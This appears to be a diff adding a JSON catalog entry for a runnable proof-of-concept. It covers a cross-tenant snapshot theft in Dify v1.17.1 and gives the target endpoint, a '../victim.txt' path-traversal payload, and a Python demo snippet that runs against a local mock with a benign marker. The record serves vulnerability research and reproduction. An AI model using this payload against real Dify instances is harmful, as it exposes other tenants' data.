@@ -1,0 +1,27 @@
+{
+  "auth": "需 key",
+  "cleanup": "`python demos/dify-home-snapshot-cross-tenant/poc.py --cleanup`；删除 `demos/.work/dify-home-snapshot-cross-tenant/`；mock 服务随脚本退出停止",
+  "component": "dify",
+  "effect": "跨租户快照 marker",
+  "entry": "HTTP GET /console/api/workspaces/current/snapshot",
+  "env": "mock 自带: `python demos/dify-home-snapshot-cross-tenant/poc.py`；上游 pin: `dify-agent/src/dify_agent/runtime_backend/local.py:240`",
+  "id": "dify-home-snapshot-cross-tenant",
+  "in_b": false,
+  "in_c": true,
+  "layer": 2,
+  "marker": "INKBLADE-BENIGN-dify-home-snapshot-cross-tenant",
+  "network": "ClusterIP",
+  "params": "snapshot_id",
+  "reason": "",
+  "sha256": "317065e9e59960120c1e7ac1502d0346f860fc7b13a65d473be77090c3190f80",
+  "snippet": "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).resolve().parents[1]))\nfrom _lib.demo import cli, run_demo\nMARKER = \"INKBLADE-BENIGN-dify-home-snapshot-cross-tenant\"\nSPEC = {'id': 'dify-home-snapshot-cross-tenant', 'kind': 'path', 'payload': '../victim.txt'}\ndef demo(args):\n    # target=127.0.0.1:<port>; args.target 默认 127.0.0.1:0\n    result = run_demo(SPEC, target=args.target, marker=args.marker)\n    assert result[\"status\"] == 200\n    assert args.marker in result.get(\"body\", \"\") or result.get(\"marker\") == args.marker\n    print(result[\"status\"], result.get(\"body\", \"\")[:160])\n    return 0",
+  "spec": {
+    "id": "dify-home-snapshot-cross-tenant",
+    "kind": "path",
+    "payload": "../victim.txt"
+  },
+  "status": "runnable",
+  "title": "Dify local runtime: snapshot/control-lease root is common ancestor -> cross-tenant home snapshot theft",
+  "upstream": "",
+  "version": "v1.17.1"
+}
